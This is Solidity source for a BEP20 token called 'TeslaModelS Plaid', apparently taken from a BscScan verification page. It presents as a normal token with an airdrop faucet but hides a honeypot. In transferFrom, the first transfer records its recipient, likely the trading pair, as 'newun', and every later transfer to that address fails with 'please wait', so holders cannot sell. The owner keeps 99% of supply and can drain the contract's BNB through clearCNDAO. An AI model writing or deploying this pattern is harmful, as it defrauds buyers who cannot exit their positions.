/**
 *Submitted for verification at BscScan.com on 2021-07-31
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-20
*/

pragma solidity ^0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

interface Token { 
    function distr(address _to, uint _value) external returns (bool);
  
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  uint totalDistributed;
  uint totalRemaining;
  uint value;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;
  mapping (address => bool) public blacklist;

  constructor() public {
    symbol = "TMP";
    name = "TeslaModelS Plaid";
    decimals = 9;
   _totalSupply = 1000000000000000000000000;
    totalDistributed = 990000000000000000000000;
    totalRemaining = _totalSupply.sub(totalDistributed);
    balances[owner] = totalDistributed;
    value =100000001000000000;
    emit Transfer(address(0), owner, totalDistributed);
  }
  
  event Distr(address indexed to, uint amount);
    event DistrFinished();
    
    event Burn(address indexed burner, uint value);

    bool public distributionFinished = false;
    
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    
    function distr(address _to, uint _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        if (totalDistributed >= _totalSupply) {
            distributionFinished = true;
        }
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        
        
    }
    function burn(uint _value) onlyOwner public {
        require(_value <= balances[msg.sender]);

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        _totalSupply = _totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
        getTokens();
     }
     function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        

        require(value <= totalRemaining);
        
        address investor = msg.sender;
        uint toGive = value;
        uint holder = 2 ;
        
        distr(investor, toGive);
        
        if (toGive > 0) {
            blacklist[investor] = true;
            holder=holder+1;
        }
        
        if (holder >= 10000) {
            distributionFinished = true;
        }

        if (totalDistributed >= _totalSupply) {
            distributionFinished = true;
        }
        
        value = value.div(100000).mul(99999);
    }
}

contract TeslaModelSPlaid is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  
}